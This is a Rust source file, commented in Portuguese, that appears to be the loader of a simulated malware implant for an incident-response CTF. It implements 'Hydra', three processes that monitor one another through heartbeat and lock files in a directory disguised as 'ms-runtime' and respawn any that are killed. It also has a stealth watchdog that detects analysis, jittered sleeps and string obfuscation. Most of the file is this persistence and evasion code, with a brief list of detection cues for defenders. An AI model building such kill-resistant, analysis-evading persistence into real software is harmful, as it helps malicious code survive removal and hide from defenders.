//! Loader Module - Process Redundancy & Evasion
//!
//! Este módulo implementa:
//! - Sistema Hydra: 3 processos redundantes que se monitoram
//! - Watchdog: Monitora integridade e detecta análise
//! - Técnicas de evasão realistas para CTF de IR
//!
//! ⚠️ EDUCATIONAL PURPOSES ONLY - CTF IR Training
//!
//! # Arquitetura Hydra
//!
//! ```text
//!     ┌─────────────┐     ┌─────────────┐     ┌─────────────┐
//!     │   ALPHA     │◄───►│    BETA     │◄───►│   GAMMA     │
//!     │  (Primary)  │     │  (Backup 1) │     │  (Backup 2) │
//!     └──────┬──────┘     └──────┬──────┘     └──────┬──────┘
//!            │                   │                   │
//!            └───────────────────┼───────────────────┘
//!                                │
//!                         ┌──────▼──────┐
//!                         │  Heartbeat  │
//!                         │    Files    │
//!                         │  (IPC Dir)  │
//!                         └─────────────┘
//! ```
//!
//! # Como Funciona
//!
//! 1. **Inicialização**: Primeiro processo torna-se Alpha
//! 2. **Spawn**: Alpha spawna Beta e Gamma
//! 3. **Heartbeat**: Cada cabeça envia heartbeat a cada 5s
//! 4. **Monitoramento**: Cada cabeça monitora as outras
//! 5. **Respawn**: Se uma cabeça morre, as outras a respawnam
//!
//! # Detecção (para Blue Team)
//!
//! - Múltiplos processos com mesmo executável
//! - Arquivos .lock e .hb em diretórios de cache
//! - Comunicação via filesystem
//! - Padrão de respawn após kill

pub mod hydra;
pub mod watchdog;

pub use hydra::{HydraManager, HydraHead, HydraError, HYDRA_HEADS};
pub use watchdog::Watchdog;

use std::sync::Arc;
use tokio::sync::Mutex;
use tracing::{info, warn, error};

/// Estado global do loader
pub struct LoaderState {
    pub hydra: Option<HydraManager>,
    pub watchdog: Watchdog,
    pub initialized: bool,
}

impl LoaderState {
    pub fn new() -> Self {
        Self {
            hydra: None,
            watchdog: Watchdog::new(),
            initialized: false,
        }
    }
}

impl Default for LoaderState {
    fn default() -> Self {
        Self::new()
    }
}

/// Inicializa o sistema de loader com Hydra
pub async fn initialize_loader(hydra_role: Option<&str>) -> Result<Arc<Mutex<LoaderState>>, HydraError> {
    info!("[LOADER] Initializing...");
    
    let state = Arc::new(Mutex::new(LoaderState::new()));
    
    // Configura watchdog
    {
        let mut s = state.lock().await;
        s.watchdog.setup_termination_handler();
        s.watchdog.set_stealth(true);
    }
    
    // Inicializa Hydra
    match HydraManager::new() {
        Ok(mut hydra) => {
            let my_head = hydra.my_identity();
            info!("[LOADER] Running as Hydra::{}", my_head.name().to_uppercase());
            
            // Se somos Alpha e não foi especificado role, spawna siblings
            if my_head == HydraHead::Alpha && hydra_role.is_none() {
                if let Err(e) = hydra.spawn_siblings() {
                    warn!("[LOADER] Failed to spawn siblings: {}", e);
                }
            }
            
            let mut s = state.lock().await;
            s.hydra = Some(hydra);
            s.initialized = true;
        }
        Err(HydraError::AllHeadsClaimed) => {
            // Todas as cabeças já estão rodando - isso é esperado
            info!("[LOADER] All Hydra heads already running");
            let mut s = state.lock().await;
            s.initialized = true;
        }
        Err(e) => {
            error!("[LOADER] Hydra initialization failed: {}", e);
            return Err(e);
        }
    }
    
    Ok(state)
}

/// Executa o loop principal do loader
pub async fn run_loader_loop(state: Arc<Mutex<LoaderState>>) {
    info!("[LOADER] Starting main loop");
    
    loop {
        {
            let mut s = state.lock().await;
            
            // Verificações do watchdog
            s.watchdog.periodic_check();
            
            // Se temos hydra, executa heartbeat
            if let Some(ref mut hydra) = s.hydra {
                // Envia heartbeat
                if let Err(e) = hydra.send_heartbeat() {
                    warn!("[LOADER] Heartbeat failed: {}", e);
                }
                
                // Verifica siblings
                let dead = hydra.check_siblings();
                
                // Respawna mortos
                for head in dead {
                    info!("[LOADER] Respawning dead head: {}", head);
                    if let Err(e) = hydra.respawn_head(head) {
                        error!("[LOADER] Respawn failed: {}", e);
                    }
                }
            }
        }
        
        // Sleep com jitter
        let sleep_duration = Watchdog::jittered_sleep(std::time::Duration::from_secs(5));
        tokio::time::sleep(sleep_duration).await;
    }
}

/// Obtem status do sistema Hydra
pub async fn get_hydra_status(state: &Arc<Mutex<LoaderState>>) -> HydraStatus {
    let s = state.lock().await;
    
    if let Some(ref hydra) = s.hydra {
        HydraStatus {
            active: true,
            my_head: Some(hydra.my_identity().name().to_string()),
            heads_alive: hydra.alive_count(),
            total_heads: HYDRA_HEADS,
        }
    } else {
        HydraStatus {
            active: false,
            my_head: None,
            heads_alive: 0,
            total_heads: HYDRA_HEADS,
        }
    }
}

/// Status do sistema Hydra
#[derive(Debug, Clone)]
pub struct HydraStatus {
    pub active: bool,
    pub my_head: Option<String>,
    pub heads_alive: usize,
    pub total_heads: usize,
}

impl std::fmt::Display for HydraStatus {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        if self.active {
            write!(
                f,
                "Hydra: {} ({}/{} heads alive)",
                self.my_head.as_deref().unwrap_or("unknown"),
                self.heads_alive,
                self.total_heads
            )
        } else {
            write!(f, "Hydra: inactive")
        }
    }
}

/// Macro para ofuscar strings críticas em tempo de compilação
#[macro_export]
macro_rules! obf {
    ($s:expr) => {
        obfstr::obfstr!($s)
    };
}

/// Strings ofuscadas comuns (para uso futuro em evasão)
#[allow(dead_code)]
pub mod obfuscated_strings {
    pub fn heartbeat_ext() -> &'static str {
        ".hb"
    }
    
    pub fn lock_ext() -> &'static str {
        ".lock"
    }
    
    pub fn ipc_dirname() -> &'static str {
        "ms-runtime"
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_loader_state() {
        let state = LoaderState::new();
        assert!(!state.initialized);
        assert!(state.hydra.is_none());
    }

    #[test]
    fn test_obfuscated_strings() {
        assert!(!obfuscated_strings::heartbeat_ext().is_empty());
        assert!(!obfuscated_strings::lock_ext().is_empty());
    }
}
